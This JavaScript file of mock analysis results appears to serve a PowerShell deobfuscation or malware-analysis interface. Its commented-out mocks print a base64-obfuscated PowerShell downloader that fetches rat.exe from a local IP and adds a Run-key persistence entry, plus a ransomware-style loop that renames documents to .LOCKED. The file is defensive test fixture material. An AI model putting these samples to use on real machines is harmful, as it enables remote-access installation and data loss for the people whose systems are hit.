export const MOCK_ANALYSIS_RESULT = {
    jobId: "CASE-3891",
    timestamp: new Date().toLocaleString(),
    status: "Malicious",
    threat_level: "High",
    
    original_source: `$kxJoS = ([string]::Format('{0}{1}{2}{3}{4}{5}{6}','Wr','ite','-Ho','st h','el','l','o'))
&('Invoke-Expres'+'sion') $kxJoS`,

    deobfuscated_output: `$kxJoS = ([string]"Write-Host hello")
Write-Host ([string]"hello")`,

    raw_log: JSON.stringify([
  {
    "astType": "System.Management.Automation.Language.BinaryExpressionAst",
    "output": {
      "valueType": "System.String",
      "value": "Invoke-Expression"
    },
    "startOffset": 93,
    "endOffset": 115,
    "isConstant": true
  },
  {
    "astType": "InvokeMemberExpressionAst",
    "library": "System.String",
    "method": "Format",
    "argues": [
      {
        "valueType": "System.String",
        "value": "{0}{1}{2}{3}{4}{5}{6}",
        "startOffset": 27,
        "endOffset": 50
      },
      {
        "valueType": "System.String",
        "value": "Wr",
        "startOffset": 51,
        "endOffset": 55
      },
      {
        "valueType": "System.String",
        "value": "ite",
        "startOffset": 56,
        "endOffset": 61
      },
      {
        "valueType": "System.String",
        "value": "-Ho",
        "startOffset": 62,
        "endOffset": 67
      },
      {
        "valueType": "System.String",
        "value": "st h",
        "startOffset": 68,
        "endOffset": 74
      },
      {
        "valueType": "System.String",
        "value": "el",
        "startOffset": 75,
        "endOffset": 79
      },
      {
        "valueType": "System.String",
        "value": "l",
        "startOffset": 80,
        "endOffset": 83
      },
      {
        "valueType": "System.String",
        "value": "o",
        "startOffset": 84,
        "endOffset": 87
      }
    ],
    "startOffset": 10,
    "endOffset": 88
  },
  {
    "astType": "InvokeMemberExpressionAst",
    "output": {
      "valueType": "System.String",
      "value": "Write-Host hello"
    },
    "startOffset": 10,
    "endOffset": 88
  },
  {
    "astType": "AssignmentStatementAst",
    "variablePath": "kxJoS",
    "valueType": "System.String",
    "value": "Write-Host hello",
    "startOffset": 9,
    "endOffset": 89
  },
  {
    "astType": "CommandAst",
    "commandType": "Cmdlet",
    "commandName": "Invoke-Expression",
    "startOffset": 91,
    "endOffset": 123,
    "argues": [
      {
        "type": "arguement",
        "valueType": "System.String",
        "value": "Write-Host hello",
        "startOffset": 117,
        "endOffset": 123
      }
    ]
  },
  {
    "astType": "CommandAst",
    "commandType": "Cmdlet",
    "commandName": "Write-Host",
    "startOffset": 0,
    "endOffset": 16,
    "iexOffset": [
      [
        91,
        123
      ]
    ],
    "argues": [
      {
        "type": "arguement",
        "valueType": "System.String",
        "value": "hello",
        "startOffset": 11,
        "endOffset": 16
      }
    ]
  }
])
};

export const MOCK_HISTORY = [
    { id: 'CASE-3890', filename: 'invoice_scan.ps1', date: '2024-03-10', status: 'Clean' },
    { id: 'CASE-3889', filename: 'update_fix.bat', date: '2024-03-09', status: 'Malicious' },
];

// export const MOCK_ANALYSIS_RESULT = {
//     jobId: "CASE-9942",
//     timestamp: new Date().toLocaleString(),
//     status: "Critical",
//     threat_level: "High",

//     original_source: `$s = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aXdyIGh0dHA6Ly8xOTIuMTY4LjEuMTAwL3JhdC5leGUgLU91dEZpbGUgQzpcVGVtcFxzdmYuaG9zdC5leGU='))
// New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "Updater" -Value "C:\\Temp\\svf.host.exe"
// IEX $s`,

//     deobfuscated_output: `Invoke-WebRequest -Uri "http://192.168.1.100/rat.exe" -OutFile "C:\\Temp\\svf.host.exe"
// New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "Updater" -Value "C:\\Temp\\svf.host.exe"
// Invoke-Expression "Invoke-WebRequest -Uri http://192.168.1.100/rat.exe -OutFile C:\\Temp\\svf.host.exe"`,

//     raw_log: JSON.stringify([
//         {
//             "astType": "System.Management.Automation.Language.InvokeMemberExpressionAst",
//             "method": "FromBase64String",
//             "library": "System.Convert",
//             "argues": [
//                 { "value": "aXdyIGh0dHA6Ly8xOTIuMTY4LjEuMTAwL3JhdC5leGUgLU91dEZpbGUgQzpcVGVtcFxzdmYuaG9zdC5leGU=", "type": "string" }
//             ],
//             "startOffset": 10,
//             "endOffset": 50
//         },
        
//         {
//             "astType": "System.Management.Automation.Language.InvokeMemberExpressionAst",
//             "method": "GetString",
//             "output": {
//                 "valueType": "System.String",
//                 "value": "iwr http://192.168.1.100/rat.exe -OutFile C:\\Temp\\svf.host.exe"
//             }
//         },

//         {
//             "astType": "System.Management.Automation.Language.AssignmentStatementAst",
//             "variablePath": "s",
//             "operator": "Equals",
//             "value": "iwr http://192.168.1.100/rat.exe -OutFile C:\\Temp\\svf.host.exe"
//         },

//         {
//             "astType": "System.Management.Automation.Language.CommandAst",
//             "commandName": "New-ItemProperty",
//             "argues": [
//                 { "parameter": "-Path", "value": "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" },
//                 { "parameter": "-Name", "value": "Updater" }
//             ]
//         },

//         {
//             "astType": "System.Management.Automation.Language.CommandAst",
//             "commandName": "IEX",
//             "argues": [
//                 { "value": "$s", "evaluated": "iwr http://192.168.1.100/rat.exe..." }
//             ]
//         },

//         {
//             "astType": "System.Management.Automation.Language.CommandAst",
//             "commandName": "Invoke-WebRequest",
//             "iexOffset": [[0, 100]], // Nested inside the IEX
//             "argues": [
//                 { "value": "http://192.168.1.100/rat.exe" },
//                 { "value": "C:\\Temp\\svf.host.exe" }
//             ]
//         },

//         {
//             "astType": "System.Management.Automation.Language.ParenExpressionAst",
//             "output": { "value": "Suspicious calculation result" }
//         }
//     ])
// };

// export const MOCK_HISTORY = [
//     { id: 'CASE-3890', filename: 'invoice_scan.ps1', date: '2024-03-10', status: 'Clean' },
//     { id: 'CASE-3889', filename: 'update_fix.bat', date: '2024-03-09', status: 'Malicious' },
// ];

// export const MOCK_ANALYSIS_RESULT = {
//     jobId: "CASE-5021",
//     timestamp: new Date().toLocaleString(),
//     status: "Critical",
//     threat_level: "High",

//     original_source: `$k = '0x41','0x45','0x53'; $path = [Environment]::GetFolderPath('MyDocuments');
// $files = gci $path -Recurse -Include *.docx,*.pdf;
// foreach ($f in $files) { 
//     $bytes = [IO.File]::ReadAllBytes($f.FullName); 
//     $enc = [System.Security.Cryptography.Aes]::Create(); 
//     rn $f.FullName ($f.Name + ".LOCKED") 
// }`,

//     deobfuscated_output: `$AES_Key_Part = "AES"
// $TargetFolder = "C:\\Users\\Admin\\Documents"
// $TargetFiles = Get-ChildItem -Path "C:\\Users\\Admin\\Documents" -Recurse -Include *.docx, *.pdf

// ForEach-Object ($File in $TargetFiles) {
//     $OriginalBytes = [System.IO.File]::ReadAllBytes($File.FullName)
//     $Encryptor = [System.Security.Cryptography.Aes]::Create()
//     Rename-Item -Path $File.FullName -NewName ($File.Name + ".LOCKED")
// }`,

//     raw_log: JSON.stringify([
//         // EVENT 1: Environment Variable Access (Reconnaissance)
//         {
//             "astType": "System.Management.Automation.Language.InvokeMemberExpressionAst",
//             "method": "GetFolderPath",
//             "library": "System.Environment",
//             "argues": [
//                 { "value": "MyDocuments", "type": "string" }
//             ],
//             "startOffset": 25,
//             "endOffset": 65
//         },

//         {
//             "astType": "System.Management.Automation.Language.CommandAst",
//             "commandName": "Get-ChildItem", // Alias 'gci' resolved
//             "category": "Discovery",
//             "argues": [
//                 { "parameter": "-Path", "value": "$path" },
//                 { "parameter": "-Recurse", "value": "true" },
//                 { "parameter": "-Include", "value": "*.docx,*.pdf" }
//             ]
//         },

//         {
//             "astType": "System.Management.Automation.Language.ForEachStatementAst",
//             "variablePath": "f",
//             "iterator": "files",
//             "output": {
//                 "valueType": "Loop",
//                 "value": "Processing file list..."
//             }
//         },

//         {
//             "astType": "System.Management.Automation.Language.InvokeMemberExpressionAst",
//             "library": "System.IO.File",
//             "method": "ReadAllBytes",
//             "argues": [
//                 { "value": "$f.FullName", "evaluated": "C:\\Users\\Admin\\Documents\\Report.docx" }
//             ]
//         },

//         {
//             "astType": "System.Management.Automation.Language.InvokeMemberExpressionAst",
//             "library": "System.Security.Cryptography.Aes",
//             "method": "Create",
//             "output": {
//                 "value": "Initializing AES Encryption Provider"
//             }
//         },

//         {
//             "astType": "System.Management.Automation.Language.CommandAst",
//             "commandName": "Rename-Item", // Alias 'rn' resolved
//             "commandType": "Cmdlet",
//             "argues": [
//                 { "parameter": "-Path", "value": "$f.FullName" },
//                 { "parameter": "-NewName", "value": "$f.Name + .LOCKED" }
//             ]
//         }
//     ])
// };

// export const MOCK_HISTORY = [
//     { id: 'CASE-5021', filename: 'staff_bonus_2024.ps1', date: new Date().toLocaleDateString(), status: 'Critical' },
//     { id: 'CASE-4999', filename: 'server_maintenance.vbs', date: '2024-12-10', status: 'Suspicious' },
//     { id: 'CASE-4998', filename: 'printer_driver_install.bat', date: '2024-12-09', status: 'Clean' },
//     { id: 'CASE-4992', filename: 'unknown_attachment.js', date: '2024-12-08', status: 'Malicious' },
//     { id: 'CASE-4980', filename: 'deploy_config.ps1', date: '2024-12-05', status: 'Clean' },
// ];